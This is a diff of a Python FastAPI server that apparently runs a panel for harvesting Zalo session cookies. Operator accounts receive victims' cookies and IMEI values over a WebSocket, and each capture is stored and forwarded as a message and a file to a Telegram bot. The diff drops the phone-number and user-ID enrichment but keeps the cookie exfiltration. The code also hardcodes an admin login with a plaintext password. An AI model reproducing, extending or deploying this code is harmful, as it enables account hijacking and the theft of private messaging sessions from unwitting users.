@@ -16,12 +16,10 @@ HISTORY_FILE  = "history.json"
 USERS_FILE    = "users.json"
 SESSIONS_FILE = "sessions.json"
 
-# ── Admin credentials (stored separately) ──────────────────────────────────
 ADMIN_ACCOUNTS = {
     "knammelbel206": hashlib.sha256("nqh300506".encode()).hexdigest()
 }
 
-# ── File helpers ────────────────────────────────────────────────────────────
 def _load(path, default):
     if not os.path.exists(path):
         return default
@@ -48,7 +46,6 @@ def add_history(record):
     records = records[:200]
     save_history(records)
 
-# ── Auth helpers ────────────────────────────────────────────────────────────
 def hash_pw(pw): return hashlib.sha256(pw.encode()).hexdigest()
 
 def create_session(username: str) -> str:
@@ -70,7 +67,6 @@ def get_session_user(token: str):
 def is_admin(username: str) -> bool:
     return username in ADMIN_ACCOUNTS
 
-# ── Telegram ────────────────────────────────────────────────────────────────
 async def send_telegram(text: str, parse_mode="HTML"):
     url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
     async with aiohttp.ClientSession() as session:
@@ -94,64 +90,16 @@ async def send_telegram_file(content: bytes, filename: str, caption: str):
         except:
             pass
 
-def get_info_from_zlapi(imei: str, cookie: dict) -> dict:
-    result = {"phone": None, "uid": None}
-    try:
-        from zlapi import ZaloAPI
-        b = ZaloAPI("_", "_", imei, session_cookies=cookie)
-        result["uid"] = str(b._state.user_id) if b._state.user_id else None
-        result["phone"] = b._state._config.get("phone_number") or None
-        if result["phone"]:
-            result["phone"] = str(result["phone"])
-        if not result["phone"] or not result["uid"]:
-            info = b.fetchAccountInfo()
-            if info:
-                profile = info.profile if hasattr(info, "profile") else (info if isinstance(info, dict) else {})
-                if isinstance(profile, dict):
-                    if not result["phone"]:
-                        p = (profile.get("phoneNumber") or profile.get("phone")
-                             or profile.get("phone_number") or profile.get("msisdn")
-                             or profile.get("mobile"))
-                        if p:
-                            result["phone"] = str(p)
-                    if not result["uid"]:
-                        u = (profile.get("userId") or profile.get("uid") or profile.get("id"))
-                        if u:
-                            result["uid"] = str(u)
-                else:
-                    if not result["phone"]:
-                        for f in ["phoneNumber", "phone", "phone_number", "msisdn", "mobile"]:
-                            v = getattr(info, f, None) or (profile.get(f) if hasattr(profile, "get") else None)
-                            if v:
-                                result["phone"] = str(v)
-                                break
-                    if not result["uid"]:
-                        for f in ["userId", "uid", "id"]:
-                            v = getattr(info, f, None)
-                            if v:
-                                result["uid"] = str(v)
-                                break
-    except Exception as e:
-        import logging
-        logging.getLogger("server").warning(f"[zlapi] get_info_from_zlapi error: {e}")
-    return result
-
-# ── Auth middleware helper ───────────────────────────────────────────────────
 def get_token_from_request(request: Request) -> str:
     auth = request.headers.get("Authorization", "")
     if auth.startswith("Bearer "):
         return auth[7:]
     return request.cookies.get("session_token", "")
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES
-# ═══════════════════════════════════════════════════════════════════════════
-
 @app.get("/")
 async def root():
     return FileResponse("static/index.html")
 
-# ── Register ────────────────────────────────────────────────────────────────
 @app.post("/api/register")
 async def register(request: Request):
     data = await request.json()
@@ -189,7 +137,6 @@ async def register(request: Request):
     token = create_session(username)
     return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})
 
-# ── Login ────────────────────────────────────────────────────────────────────
 @app.post("/api/login")
 async def login(request: Request):
     data = await request.json()
@@ -199,7 +146,6 @@ async def login(request: Request):
     if not username or not password:
         raise HTTPException(400, "Thiếu tên đăng nhập hoặc mật khẩu")
 
-    # Check admin
     if username in ADMIN_ACCOUNTS:
         if ADMIN_ACCOUNTS[username] != hash_pw(password):
             raise HTTPException(401, "Sai mật khẩu")
@@ -218,7 +164,6 @@ async def login(request: Request):
     token = create_session(username)
     return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})
 
-# ── Logout ───────────────────────────────────────────────────────────────────
 @app.post("/api/logout")
 async def logout(request: Request):
     token = get_token_from_request(request)
@@ -228,7 +173,6 @@ async def logout(request: Request):
         save_sessions(sessions)
     return JSONResponse({"ok": True})
 
-# ── History (auth required) ──────────────────────────────────────────────────
 @app.get("/api/history")
 async def get_history(request: Request):
     token    = get_token_from_request(request)
@@ -237,12 +181,10 @@ async def get_history(request: Request):
         raise HTTPException(401, "Chưa đăng nhập")
 
     records = load_history()
-    # Non-admin: only see their own records
     if not is_admin(username):
         records = [r for r in records if r.get("owner") == username]
     return JSONResponse(records)
 
-# ── Admin: list users ─────────────────────────────────────────────────────────
 @app.get("/api/admin/users")
 async def admin_users(request: Request, page: int = 0):
     token    = get_token_from_request(request)
@@ -256,7 +198,7 @@ async def admin_users(request: Request, page: int = 0):
         items.append({
             "username": uname,
             "email":    udata.get("email", ""),
-            "password": udata.get("password", ""),   # hashed
+            "password": udata.get("password", ""),
             "created":  udata.get("created", ""),
             "active":   udata.get("active", True)
         })
@@ -267,7 +209,6 @@ async def admin_users(request: Request, page: int = 0):
     chunk    = items[page * per_page:(page + 1) * per_page]
     return JSONResponse({"total": total, "page": page, "per_page": per_page, "users": chunk})
 
-# ── Admin: toggle user active ─────────────────────────────────────────────────
 @app.post("/api/admin/users/{target}/toggle")
 async def admin_toggle_user(target: str, request: Request):
     token    = get_token_from_request(request)
@@ -282,7 +223,6 @@ async def admin_toggle_user(target: str, request: Request):
     save_users(users)
     return JSONResponse({"ok": True, "active": users[target]["active"]})
 
-# ── Admin: delete user ────────────────────────────────────────────────────────
 @app.delete("/api/admin/users/{target}")
 async def admin_delete_user(target: str, request: Request):
     token    = get_token_from_request(request)
@@ -297,12 +237,10 @@ async def admin_delete_user(target: str, request: Request):
     save_users(users)
     return JSONResponse({"ok": True})
 
-# ── WebSocket (auth required) ─────────────────────────────────────────────────
 @app.websocket("/ws/{session_id}")
 async def ws_endpoint(ws: WebSocket, session_id: str):
     await ws.accept()
 
-    # Auth check via query param token
     token    = ws.query_params.get("token", "")
     username = get_session_user(token)
     if not username:
@@ -336,32 +274,12 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
         cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
         now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-        phone = (user.get("phoneNumber") or user.get("phone") or user.get("phone_number") or user.get("msisdn") or user.get("mobile") or "")
-        uid   = (user.get("userId") or user.get("uid") or user.get("id") or "")
-
-        if not phone or phone == "N/A" or not uid or uid == "N/A":
-            try:
-                loop = asyncio.get_event_loop()
-                zlapi_info = await loop.run_in_executor(None, get_info_from_zlapi, imei, cookies)
-                if not phone or phone == "N/A":
-                    phone = zlapi_info.get("phone") or phone
-                    user["phoneNumber"] = phone
-                if not uid or uid == "N/A":
-                    uid = zlapi_info.get("uid") or uid
-                    user["userId"] = uid
-            except:
-                pass
-
-        name  = user.get("displayName") or user.get("name", "N/A")
-        uid   = user.get("userId", "N/A") or "N/A"
-        phone = user.get("phoneNumber", "Không rõ") or "Không rõ"
+        name = user.get("displayName", "N/A") or "N/A"
 
         record = {
             "id":         session_id[:8],
             "owner":      username,
             "name":       name,
-            "phone":      phone,
-            "user_id":    uid,
             "imei":       imei,
             "cookie_str": cookie_str,
             "cookies":    cookies,
@@ -373,7 +291,7 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
 
         txt = (
             f"=== ZALO COOKIE ===\n"
-            f"Tên: {name}\nSĐT: {phone}\nUserID: {uid}\nIMEI: {imei}\n"
+            f"Tên: {name}\nIMEI: {imei}\n"
             f"Thời gian: {now}\nLấy bởi: {username}\n\n"
             f"--- COOKIE STRING ---\n{cookie_str}\n\n"
             f"--- COOKIE JSON ---\n{json.dumps(cookies, ensure_ascii=False, indent=2)}\n"
@@ -381,16 +299,16 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
 
         tg_text = (
             f"🍪 <b>ZALO COOKIE MỚI</b>\n\n"
-            f"👤 Tên: <b>{name}</b>\n📱 SĐT: <code>{phone}</code>\n"
-            f"🆔 UserID: <code>{uid}</code>\n📡 IMEI: <code>{imei}</code>\n"
+            f"👤 Tên: <b>{name}</b>\n"
+            f"📡 IMEI: <code>{imei}</code>\n"
             f"🕐 Thời gian: {now}\n👨‍💻 Lấy bởi: <code>{username}</code>\n\n"
             f"<b>Cookie String:</b>\n<code>{cookie_str[:500]}{'...' if len(cookie_str)>500 else ''}</code>"
         )
         asyncio.create_task(send_telegram(tg_text))
         asyncio.create_task(send_telegram_file(
             txt.encode("utf-8"),
-            f"cookie_{phone}_{now[:10].replace('/','-')}.txt",
-            f"📄 Cookie file — {name} ({phone}) | by {username}"
+            f"cookie_{name}_{now[:10].replace('/','-')}.txt",
+            f"📄 Cookie file — {name} | by {username}"
         ))
 
     except WebSocketDisconnect:
